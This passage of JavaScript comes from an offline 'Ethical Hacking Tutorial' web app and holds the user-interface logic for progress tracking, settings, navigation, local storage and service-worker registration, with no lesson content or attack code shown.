                        ` : '<div></div>'}
                    </div>
                </div>
            </div>
        `;
        
        this.updateNavigation('lessons');
        
        // Highlight code blocks
        if (window.Prism) {
            Prism.highlightAll();
        }
    }

    showProgress() {
        this.currentView = 'progress';
        const completedCount = this.completedLessons.length;
        const totalCount = Object.keys(this.lessons).length;
        const progressPercent = Math.round((completedCount / totalCount) * 100);

        document.getElementById('headerTitle').textContent = 'Progress';
        document.getElementById('headerSubtitle').textContent = `${completedCount}/${totalCount} Completed`;
        document.getElementById('backBtn').style.display = 'flex';
        
        document.getElementById('mainContent').innerHTML = `
            <div class="progress-detailed">
                <div class="progress-stats-large text-center mb-4">
                    <div class="progress-circle-large">
                        <svg viewBox="0 0 200 200">
                            <circle cx="100" cy="100" r="80" fill="none" stroke="#333" stroke-width="12"/>
                            <circle cx="100" cy="100" r="80" fill="none" stroke="#0d6efd" stroke-width="12"
                                    stroke-dasharray="${progressPercent * 5.024} 502.4"
                                    stroke-linecap="round" transform="rotate(-90 100 100)"/>
                        </svg>
                        <div class="progress-text-large">
                            <span class="progress-number-large">${progressPercent}%</span>
                            <span class="progress-label">Complete</span>
                        </div>
                    </div>
                    <h4 class="mt-3">${completedCount} of ${totalCount} Lessons</h4>
                    <p class="text-muted">You're making great progress!</p>
                </div>

                <div class="lesson-progress-list">
                    ${Object.entries(this.lessons).map(([id, lesson]) => `
                        <div class="lesson-progress-item ${this.completedLessons.includes(parseInt(id)) ? 'completed' : ''}">
                            <div class="lesson-status-icon">
                                ${this.completedLessons.includes(parseInt(id)) ? 
                                    '<i class="fas fa-check-circle text-success"></i>' : 
                                    '<i class="far fa-circle text-muted"></i>'}
                            </div>
                            <div class="lesson-details">
                                <h6>Lesson ${id}: ${lesson.title}</h6>
                                <small class="text-muted">
                                    <i class="fas fa-clock me-1"></i>${lesson.duration}
                                </small>
                            </div>
                            <button class="btn btn-sm btn-outline-primary" onclick="app.showLesson(${id})">
                                ${this.completedLessons.includes(parseInt(id)) ? 'Review' : 'Start'}
                            </button>
                        </div>
                    `).join('')}
                </div>

                ${completedCount > 0 ? `
                    <div class="text-center mt-4">
                        <button class="btn btn-outline-danger" onclick="app.resetProgress()">
                            <i class="fas fa-redo me-2"></i>Reset All Progress
                        </button>
                    </div>
                ` : ''}
            </div>
        `;
        
        this.updateNavigation('progress');
    }

    showSettings() {
        this.currentView = 'settings';
        document.getElementById('headerTitle').textContent = 'Settings';
        document.getElementById('headerSubtitle').textContent = 'App Configuration';
        document.getElementById('backBtn').style.display = 'flex';
        
        document.getElementById('mainContent').innerHTML = `
            <div class="settings-content">
                <div class="settings-section">
                    <h6><i class="fas fa-paint-brush me-2"></i>Appearance</h6>
                    <div class="setting-item">
                        <div class="setting-label">
                            <strong>Dark Mode</strong>
                            <small class="text-muted d-block">Optimized for cybersecurity learning</small>
                        </div>
                        <div class="form-check form-switch">
                            <input class="form-check-input" type="checkbox" checked disabled>
                        </div>
                    </div>
                </div>

                <div class="settings-section">
                    <h6><i class="fas fa-database me-2"></i>Data</h6>
                    <div class="setting-item">
                        <div class="setting-label">
                            <strong>Storage</strong>
                            <small class="text-muted d-block">Local browser storage</small>
                        </div>
                        <span class="text-muted">Offline</span>
                    </div>
                    <div class="setting-item">
                        <button class="btn btn-outline-danger w-100" onclick="app.clearAllData()">
                            <i class="fas fa-trash me-2"></i>Clear All Data
                        </button>
                    </div>
                </div>

                <div class="settings-section">
                    <h6><i class="fas fa-info-circle me-2"></i>About</h6>
                    <div class="setting-item">
                        <div class="setting-label">
                            <strong>Ethical Hacking Tutorial</strong>
                            <small class="text-muted d-block">Version 1.0 - Offline Edition</small>
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">
                            <strong>Developer</strong>
                            <small class="text-muted d-block">Built for cybersecurity education</small>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        this.updateNavigation('settings');
    }

    toggleLessonMenu() {
        const overlay = document.getElementById('lessonMenuOverlay');
        const isVisible = overlay.style.display === 'block';
        overlay.style.display = isVisible ? 'none' : 'block';
    }

    completeLesson(lessonId) {
        const id = parseInt(lessonId);
        if (!this.completedLessons.includes(id)) {
            this.completedLessons.push(id);
            this.saveProgress();
            this.updateProgress();
            
            // Update the button
            const button = document.querySelector('.btn-success');
            if (button) {
                button.innerHTML = '<i class="fas fa-check me-2"></i>Completed';
                button.classList.add('disabled');
            }
            
            // Show congratulations
            this.showToast(`Lesson ${id} completed! Great job!`);
        }
    }

    resetProgress() {
        if (confirm('Are you sure you want to reset all progress? This cannot be undone.')) {
            this.completedLessons = [];
            this.saveProgress();
            this.updateProgress();
            this.showHome();
            this.showToast('Progress reset successfully!');
        }
    }

    clearAllData() {
        if (confirm('Are you sure you want to clear all data? This will reset your progress and cannot be undone.')) {
            localStorage.clear();
            this.completedLessons = [];
            this.showHome();
            this.showToast('All data cleared successfully!');
        }
    }

    getNextLesson() {
        for (let i = 1; i <= Object.keys(this.lessons).length; i++) {
            if (!this.completedLessons.includes(i)) {
                return i;
            }
        }
        return 1; // If all completed, return to first lesson
    }

    updateProgress() {
        // Update any progress displays
        this.updateTime();
    }

    updateNavigation(active) {
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        
        const navMap = {
            'home': 0,
            'lessons': 1,
            'progress': 2,
            'settings': 3
        };
        
        const activeIndex = navMap[active];
        if (activeIndex !== undefined) {
            document.querySelectorAll('.nav-item')[activeIndex].classList.add('active');
        }
    }

    updateTime() {
        const now = new Date();
        const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        document.getElementById('statusTime').textContent = timeString;
    }

    saveProgress() {
        localStorage.setItem('ethicalHackingProgress', JSON.stringify(this.completedLessons));
    }

    loadProgress() {
        const saved = localStorage.getItem('ethicalHackingProgress');
        return saved ? JSON.parse(saved) : [];
    }

    loadLessonFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const lessonParam = urlParams.get('lesson');
        const tabParam = urlParams.get('tab');
        
        if (lessonParam && this.lessons[lessonParam]) {
            this.showLesson(lessonParam);
        } else if (tabParam === 'progress') {
            this.showProgress();
        }
    }

    showToast(message) {
        // Simple toast notification
        const toast = document.createElement('div');
        toast.className = 'toast-notification';
        toast.textContent = message;
        toast.style.cssText = `
            position: fixed;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(13, 110, 253, 0.9);
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            z-index: 9999;
            backdrop-filter: blur(10px);
        `;
        
        document.body.appendChild(toast);
        
        setTimeout(() => {
            toast.remove();
        }, 3000);
    }

    bindEvents() {
        // Update time every minute
        setInterval(() => this.updateTime(), 60000);
        this.updateTime();
        
        // Handle keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch (e.key) {
                    case 'h':
                        e.preventDefault();
                        this.showHome();
                        break;
                    case 'ArrowLeft':
                        e.preventDefault();
                        if (this.currentView === 'lesson' && this.currentLesson > 1) {
                            this.showLesson(this.currentLesson - 1);
                        }
                        break;
                    case 'ArrowRight':
                        e.preventDefault();
                        if (this.currentView === 'lesson' && this.currentLesson < Object.keys(this.lessons).length) {
                            this.showLesson(this.currentLesson + 1);
                        }
                        break;
                }
            }
        });
    }
}

// Initialize the app when the page loads
let app;
document.addEventListener('DOMContentLoaded', () => {
    app = new OfflineEthicalHackingApp();
});

// Service Worker registration for PWA functionality
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('./sw.js')
            .then((registration) => {
                console.log('SW registered: ', registration);
            })
            .catch((registrationError) => {
                console.log('SW registration failed: ', registrationError);
            });
    });
}